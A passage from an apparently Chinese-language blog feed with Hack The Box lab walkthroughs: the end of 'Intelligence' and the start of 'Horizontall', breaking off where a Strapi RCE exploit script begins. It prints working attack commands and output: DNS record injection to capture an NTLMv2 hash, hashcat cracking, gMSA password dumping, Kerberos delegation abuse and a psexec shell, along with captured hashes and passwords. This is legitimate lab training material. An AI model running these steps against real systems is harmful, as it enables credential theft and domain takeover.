bash">$ smbclient //10.10.10.248/Users -U Tiffany.Molina<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\Tiffany.Molina]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <br></code></pre></td></tr></table></figure><p>看起来是把整个Users目录都共享了出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                  DR        0  Mon Apr 19 09:20:26 2021<br>  ..                                 DR        0  Mon Apr 19 09:20:26 2021<br>  Administrator                       D        0  Mon Apr 19 08:18:39 2021<br>  All Users                       DHSrn        0  Sat Sep 15 15:21:46 2018<br>  Default                           DHR        0  Mon Apr 19 10:17:40 2021<br>  Default User                    DHSrn        0  Sat Sep 15 15:21:46 2018<br>  desktop.ini                       AHS      174  Sat Sep 15 15:11:27 2018<br>  Public                             DR        0  Mon Apr 19 08:18:39 2021<br>  Ted.Graves                          D        0  Mon Apr 19 09:20:26 2021<br>  Tiffany.Molina                      D        0  Mon Apr 19 08:51:46 2021<br></code></pre></td></tr></table></figure><p>在用户Tiffany.Molina 桌面可以捕捉到user.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \Tiffany.Molina\Desktop\&gt; <span class="hljs-built_in">ls</span><br>  .                                  DR        0  Mon Apr 19 08:51:46 2021<br>  ..                                 DR        0  Mon Apr 19 08:51:46 2021<br>  user.txt                           AR       34  Wed May 25 19:45:09 2022<br><br>3770367 blocks of size 4096. 1466935 blocks available<br>smb: \Tiffany.Molina\Desktop\&gt; get user.txt <br>getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)<br>smb: \Tiffany.Molina\Desktop\&gt; <br></code></pre></td></tr></table></figure><p>我尝试了bloodhound，但是收集到的信息太少太少了。在IT共享目录有个powershell脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.248/IT -U Tiffany.Molina<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\Tiffany.Molina]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; LS<br>  .                                   D        0  Mon Apr 19 08:50:55 2021<br>  ..                                  D        0  Mon Apr 19 08:50:55 2021<br>  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021<br><br>3770367 blocks of size 4096. 1464066 blocks available<br>smb: \&gt; get downdetector.ps1 <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> downdetector.ps1 <br>��<span class="hljs-comment"># Check web server status. Scheduled to run every 5min</span><br><span class="hljs-built_in">Import-Module</span> ActiveDirectory <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$record</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | <span class="hljs-built_in">Where-Object</span> Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;web*&quot;</span>)  &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$request</span> = <span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-literal">-Uri</span> <span class="hljs-string">&quot;http://<span class="hljs-variable">$</span>(<span class="hljs-variable">$record</span>.Name)&quot;</span> <span class="hljs-literal">-UseDefaultCredentials</span><br><span class="hljs-keyword">if</span>(.StatusCode <span class="hljs-operator">-ne</span> <span class="hljs-number">200</span>) &#123;<br><span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-From</span> <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="hljs-literal">-To</span> <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;Host: <span class="hljs-variable">$</span>(<span class="hljs-variable">$record</span>.Name) is down&quot;</span><br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>它看起来像是在使用默认凭据不断的搜寻域内开启80端口http服务且主机名是以web开头的主机脚本，我只关心它的默认凭据，那么我需要让他意识到我的主机名是模板域内的，让它返现我并访问到我，它才会拿着凭据来与我进行认证。那么我需要添加一个机器账户并将其dnshostname值指向我的主机，这样目标变回通过DNS解析访问到我。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dnstool -u <span class="hljs-string">&#x27;intelligence.htb\Tiffany.Molina&#x27;</span> -p NewIntelligenceCorpUser9876 -a add -d 10.10.16.11 -r web.intelligence.htb 10.10.10.248<br>[-] Connecting to host...<br>[-] Binding to host<br>[+] Bind OK<br>[-] Adding new record<br>[+] LDAP operation completed successfully<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[HTTP] NTLMv2 Client   : ::ffff:10.10.10.248<br>[HTTP] NTLMv2 Username : intelligence\Ted.Graves<br>[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:ab29604c29984e7a:87C7EF234FF4C01F4638B8731C466487:01010000000000006D8E721C5070D80121C54933D43109EB0000000002000800370042005800560001001E00570049004E002D0056005400590055005A004B00450051004800490033000400140037004200580056002E004C004F00430041004C0003003400570049004E002D0056005400590055005A004B00450051004800490033002E0037004200580056002E004C004F00430041004C000500140037004200580056002E004C004F00430041004C0008003000300000000000000000000000002000003BD7A88BC395384C35A66C5FD590E6049F1A4963B42CC4E67D7B24CC958616460A001000000000000000000000000000000000000900320048005400540050002F007700650062002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Ted.Graves::intelligence:ab29604c29984e7a:87C7EF234FF4C01F4638B8731C466487:01010000000000006D8E721C5070D80121C54933D43109EB0000000002000800370042005800560001001E00570049004E002D0056005400590055005A004B00450051004800490033000400140037004200580056002E004C004F00430041004C0003003400570049004E002D0056005400590055005A004B00450051004800490033002E0037004200580056002E004C004F00430041004C000500140037004200580056002E004C004F00430041004C0008003000300000000000000000000000002000003BD7A88BC395384C35A66C5FD590E6049F1A4963B42CC4E67D7B24CC958616460A001000000000000000000000000000000000000900320048005400540050002F007700650062002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000&#x27;</span> &gt; <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hashcat -m 5600 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt<br><br>TED.GRAVES::intelligence:ab29604c29984e7a:87c7ef234ff4c01f4638b8731c466487:01010000000000006d8e721c5070d80121c54933d43109eb0000000002000800370042005800560001001e00570049004e002d0056005400590055005a004b00450051004800490033000400140037004200580056002e004c004f00430041004c0003003400570049004e002d0056005400590055005a004b00450051004800490033002e0037004200580056002e004c004f00430041004c000500140037004200580056002e004c004f00430041004c0008003000300000000000000000000000002000003bd7a88bc395384c35a66c5fd590e6049f1a4963b42cc4e67d7b24cc958616460a001000000000000000000000000000000000000900320048005400540050002f007700650062002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Mr.Teddy&#x27;</span> &gt;&gt; passwd.txt<br></code></pre></td></tr></table></figure><p>口令正确：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.248 -u TED.GRAVES -p Mr.Teddy <br>/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated<br>  <span class="hljs-string">&quot;class&quot;</span>: algorithms.Blowfish,<br>SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.10.248    445    DC               [+] intelligence.htb\TED.GRAVES:Mr.Teddy <br></code></pre></td></tr></table></figure><p>我准备再尝试bloodhound一波：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220525171803861.png" alt="image-20220525171803861"></p><p>TED.GRAVES用户属于ITSUPPORT组，SVC_INT.INTELLIGENCE.HTB 是一个组托管服务帐户。 <a href="mailto:&#73;&#x54;&#83;&#x55;&#x50;&#80;&#79;&#82;&#x54;&#x40;&#x49;&#x4e;&#x54;&#x45;&#x4c;&#x4c;&#x49;&#x47;&#x45;&#78;&#x43;&#69;&#46;&#72;&#84;&#66;">&#73;&#x54;&#83;&#x55;&#x50;&#80;&#79;&#82;&#x54;&#x40;&#x49;&#x4e;&#x54;&#x45;&#x4c;&#x4c;&#x49;&#x47;&#x45;&#78;&#x43;&#69;&#46;&#72;&#84;&#66;</a> 组可以检索 GMSA SVC_INT.INTELLIGENCE.HTB 的密码。其实就是我间接的拥有了这个账户。因为我能够获取到它的哈希：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gMSADumper -u TED.GRAVES -p Mr.Teddy -d intelligence.htb<br>Users or <span class="hljs-built_in">groups</span> <span class="hljs-built_in">who</span> can <span class="hljs-built_in">read</span> password <span class="hljs-keyword">for</span> svc_int$:<br> &gt; DC$<br> &gt; itsupport<br>svc_int$:::67065141d298d67a17ee8626476b20f9<br></code></pre></td></tr></table></figure><p>再看svc_int账户：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220525173058431.png" alt="image-20220525173058431"></p><p>它具有域控制器的约束委派权限，它可以代表任何用户去申请DC的ST票据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ getST.py -spn <span class="hljs-string">&#x27;www/dc.intelligence.htb&#x27;</span> -impersonate administrator intelligence.htb/svc_int$ -hashes :67065141d298d67a17ee8626476b20f9 -dc-ip 10.10.10.248 <br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[-] CCache file is not found. Skipping...<br>[*] Getting TGT <span class="hljs-keyword">for</span> user<br>[*] Impersonating administrator<br>[*] Requesting S4U2self<br>[*] Requesting S4U2Proxy<br>[*] Saving ticket <span class="hljs-keyword">in</span> administrator.ccache<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ klist <br>Ticket cache: FILE:administrator.ccache<br>Default principal: administrator@intelligence.htb<br><br>Valid starting       Expires              Service principal<br>2022-05-25T20:37:45  2022-05-26T06:37:43  www/dc.intelligence.htb@INTELLIGENCE.HTB<br>renew <span class="hljs-keyword">until</span> 2022-05-26T20:37:42<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ psexec.py -k -no-pass dc.intelligence.htb<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[*] Requesting shares on dc.intelligence.htb.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file TbSzuryi.exe<br>[*] Opening SVCManager on dc.intelligence.htb.....<br>[*] Creating service FHIW on dc.intelligence.htb.....<br>[*] Starting service FHIW.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version 10.0.17763.1879]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; <span class="hljs-built_in">type</span> C:\Users\Administrator\Desktop\root.txt<br>31.......................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Horizontall</title>
    <link href="/post/HackTheBox-Horizontall.html"/>
    <url>/post/HackTheBox-Horizontall.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-17 03:37:03 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.11.105<br>Discovered open port 80/tcp on 10.10.11.105 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> horizontall.htb (10.10.11.105)<br>Host is up (0.16s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:<span class="hljs-built_in">cd</span>:ff:6b:0d:d5 (RSA)<br>|   256 3a:d5:89:d5:da:95:59:d9:<span class="hljs-built_in">df</span>:01:68:37:ca:d5:10:b0 (ECDSA)<br>|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)<br>80/tcp open  http    nginx 1.14.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://horizontall.htb<br>|_http-server-header: nginx/1.14.0 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.16 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://horizontall.htb<br><br>http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]<br></code></pre></td></tr></table></figure><p>页面没有任何内容，所见非真：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517114731091.png" alt="image-20220517114731091"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dirsearch -u http://horizontall.htb<br><br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/mosaictheory/.dirsearch/reports/horizontall.htb/_22-05-17_11-43-09.txt<br><br>Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-17_11-43-09.<span class="hljs-built_in">log</span><br><br>Target: http://horizontall.htb/<br><br>[11:43:10] Starting: <br>[11:43:12] 301 -  194B  - /js  -&gt;  http://horizontall.htb/js/<br>[11:43:51] 301 -  194B  - /css  -&gt;  http://horizontall.htb/css/<br>[11:43:56] 200 -    4KB - /favicon.ico<br>[11:44:01] 301 -  194B  - /img  -&gt;  http://horizontall.htb/img/<br>[11:44:02] 200 -  901B  - /index.html<br>[11:44:03] 403 -  580B  - /js/<br></code></pre></td></tr></table></figure><p>这个站点像是一个谎言，我应该寻找其他站点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; gobuster vhost -u http://horizontall.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t200<br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:          http://horizontall.htb/<br>[+] Method:       GET<br>[+] Threads:      200<br>[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br>[+] User Agent:   gobuster/3.1.0<br>[+] Timeout:      10s<br>===============================================================<br>2022/05/17 12:09:46 Starting gobuster <span class="hljs-keyword">in</span> VHOST enumeration mode<br>===============================================================<br>Found: api-prod.horizontall.htb (Status: 200) [Size: 413]<br>                                                         <br>===============================================================<br>2022/05/17 12:11:17 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://api-prod.horizontall.htb/                                                                                                    <br>http://api-prod.horizontall.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Strict-Transport-Security[max-age=31536000; includeSubDomains], Title[Welcome to your API], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[Strapi &lt;strapi.io&gt;], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.14.0]<br></code></pre></td></tr></table></figure><p>Strapi cms.页面也很简单，只有一条欢迎语句：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html">&gt;&gt; curl http://api-prod.horizontall.htb/<br><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to your API<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dirsearch -u http://api-prod.horizontall.htb<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/mosaictheory/.dirsearch/reports/api-prod.horizontall.htb/_22-05-17_12-15-04.txt<br><br>Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-17_12-15-04.<span class="hljs-built_in">log</span><br><br>Target: http://api-prod.horizontall.htb/<br><br>[12:15:04] Starting: <br>[12:15:18] 200 -  854B  - /ADMIN<br>[12:15:18] 200 -  854B  - /Admin<br>[12:15:18] 200 -  854B  - /Admin/login/<br>[12:15:23] 400 -   67B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[12:15:53] 200 -    1KB - /favicon.ico<br>[12:15:58] 200 -  413B  - /index.html<br>[12:16:17] 200 -  121B  - /robots.txt<br>[12:16:17] 200 -  507B  - /reviews<br><br>Task Completed<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517121856344.png" alt="image-20220517121856344"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517122249151.png" alt="image-20220517122249151"  /><p>我需要想方法获取Strapi的版本，在源码中会有这么一串提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">A lot of magic happens <span class="hljs-keyword">in</span> this file. HtmlWebpackPlugin automatically includes all assets (e.g. bundle.js, main.css) with the correct HTML tags, <span class="hljs-built_in">which</span> is why they are missing <span class="hljs-keyword">in</span> this HTML file. Don<span class="hljs-string">&#x27;t add any assets here! (Check out webpackconfig.js if you want to know more)  </span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517123453787.png" alt="image-20220517123453787"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit strapi 3.0.0-beta.17.4<br>--------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                             |  Path<br>--------------------------------------------------------------------------- ---------------------------------<br>Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py<br>Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)   | nodejs/webapps/50716.rb<br>--------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br>&gt;&gt; searchsploit -m multiple/webapps/50239.py<br>  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)<br>      URL: https://www.exploit-db.com/exploits/50239<br>     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py<br>File Type: Python script, ASCII text executable<br><br>Copied to: /home/mosaictheory/50239.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 